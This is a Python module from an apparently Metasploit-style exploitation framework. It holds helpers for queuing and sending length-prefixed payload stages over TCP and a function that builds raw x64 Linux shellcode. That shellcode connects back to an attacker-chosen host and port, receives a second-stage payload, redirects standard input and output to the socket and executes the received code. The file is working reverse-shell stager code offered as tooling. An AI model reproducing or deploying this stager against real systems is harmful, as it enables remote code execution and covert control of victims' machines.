#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Stager/stage pairing helpers (MSF-style length-prefixed stage over TCP)."""

from __future__ import annotations

import socket
import struct
import threading
from typing import Optional

_PENDING_STAGES: dict[str, bytes] = {}
_PENDING_LOCK = threading.Lock()

DEFAULT_STAGE_PATH = "payloads/singles/cmd/unix/linux_x64_shell_stage"
DEFAULT_STAGE_KEY = "__default__"


def stage_key(lhost: str = "", lport: int = 0) -> str:
    """Build a queue key for a reverse listener endpoint."""
    host = str(lhost or "").strip()
    if host and int(lport or 0) > 0:
        return f"{host}:{int(lport)}"
    return DEFAULT_STAGE_KEY


def set_pending_stage(stage_bytes: bytes, *, lhost: str = "", lport: int = 0) -> None:
    key = stage_key(lhost, lport)
    with _PENDING_LOCK:
        _PENDING_STAGES[key] = bytes(stage_bytes or b"")


def pop_pending_stage(lhost: str = "", lport: int = 0) -> Optional[bytes]:
    key = stage_key(lhost, lport)
    with _PENDING_LOCK:
        if key in _PENDING_STAGES:
            data = _PENDING_STAGES.pop(key)
            return data if data else None
        if key != DEFAULT_STAGE_KEY and DEFAULT_STAGE_KEY in _PENDING_STAGES:
            data = _PENDING_STAGES.pop(DEFAULT_STAGE_KEY)
            return data if data else None
        return None


def send_stage_over_socket(sock, stage_bytes: bytes) -> None:
    """Send 4-byte big-endian length + stage payload (MSF convention)."""
    stage = bytes(stage_bytes)
    header = struct.pack(">I", len(stage))
    sock.sendall(header + stage)


def load_stage_module(framework, stage_path: str) -> bytes:
    """Load a payload module and return raw stage bytes from generate()."""
    if not framework or not hasattr(framework, "module_loader"):
        raise RuntimeError("framework module_loader unavailable")
    mod = framework.module_loader.load_module(stage_path, framework=framework)
    if not mod or not hasattr(mod, "generate"):
        raise RuntimeError(f"stage module invalid: {stage_path}")
    out = mod.generate()
    if isinstance(out, str):
        out = out.encode("latin-1", errors="replace")
    return bytes(out)


def prepare_staged_exploit(
    framework,
    stager_path: str,
    stage_path: str = DEFAULT_STAGE_PATH,
    *,
    lhost: str = "",
    lport: int = 0,
) -> bytes:
    """Resolve stage bytes and queue them for the matching reverse_tcp accept."""
    stage = load_stage_module(framework, stage_path)
    set_pending_stage(stage, lhost=lhost, lport=lport)
    return stage


def build_linux_x64_recv_stager(lhost: str, lport: int) -> bytes:
    """Connect back, recv 4-byte stage length + stage, dup2, execute (x64 Linux)."""
    from core.framework.payload import Payload

    class _Helper(Payload):
        pass

    helper = _Helper()
    sc = b""
    sc += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
    sc += b"\x49\x89\xfc"  # mov r12, rdi
    sc += b"\x48\xb9\x02\x00"
    sc += helper.shellcode_port(int(lport))
    sc += helper.shellcode_ip(str(lhost))
    sc += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
    sc += b"\x48\x83\xec\x08"  # room for 4-byte length
    sc += b"\x4c\x89\xe7"      # mov rdi, r12
    sc += b"\x48\x89\xe6"      # mov rsi, rsp
    sc += b"\xba\x04\x00\x00\x00"
    sc += b"\x31\xc0\x0f\x05"  # read(4)
    sc += b"\x8b\x1c\x24"      # mov ebx, [rsp]
    sc += b"\x0f\xc8"          # bswap ebx
    sc += b"\x48\x29\xdc"      # sub rsp, rbx
    sc += b"\x48\x89\xe6"      # mov rsi, rsp
    sc += b"\x4c\x89\xe7"      # mov rdi, r12
    sc += b"\x48\x89\xda"      # mov rdx, rbx
    sc += b"\x31\xc0\x0f\x05"  # read(stage)
    sc += b"\x6a\x03\x5e"      # push 3; pop rsi
    sc += b"\x48\xff\xce"      # dec rsi
    sc += b"\x6a\x21\x58"      # dup2
    sc += b"\x4c\x89\xe7"      # mov rdi, r12
    sc += b"\x0f\x05"
    sc += b"\x75\xf6"          # jne dup2_loop
    sc += b"\x48\x89\xe7"      # mov rdi, rsp
    sc += b"\xff\xd7"          # call rdi
    return sc
